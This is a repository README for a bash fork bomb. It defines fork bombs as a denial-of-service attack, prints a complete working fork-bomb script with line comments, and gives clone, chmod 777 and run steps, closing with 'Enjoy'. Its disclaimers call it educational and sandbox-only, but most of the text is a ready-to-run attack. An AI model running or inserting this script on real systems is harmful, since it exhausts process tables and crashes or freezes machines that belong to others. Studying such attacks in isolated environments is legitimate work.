# fork_bomb_sh
.sh script - a fork bomb is a type of denial-of-service (DoS) attack that overloads a system by creating recursively an enormous number of processes

## Disclaimer
This project is solely for educational purposes, demonstrating how process forking can lead to a system crash. Misuse of this script or using it maliciously may have legal consequences. Always use caution and ensure you are working in a secure, isolated environment when running this code.

## Description
A fork bomb is a type/form of Denial-of-Service (DoS) attack that creates recursively an enormous number of processes to overwhelm a system which cause the system to freeze or restart

> **WARNING**: This code should be only executed in a controlled env, such as a virtual machine or isolated sandbox
> This repo is for educational purposes only

## Script Code

```bash
#!/bin/bash # interpreter

:() {       # define a function with the name ":"
    : | : & # the function calls itself twice and runs in the background
}           # end of function
:           # call the function, starting the fork bomb
```

## How to Run the Script
1. clone the repo:
```sh
git clone https://github.com/jaroslavdusek1/fork_bomb_sh.git
cd fork_bomb_sh
```

2. Handle exe permissions
```sh
chmod +x fork-bomb.sh
chmod 777 fork-bomb.sh (isolated ENV or env without access other users)
```

3. Run the script
```sh
./fork-bomb.sh
```

Enjoy
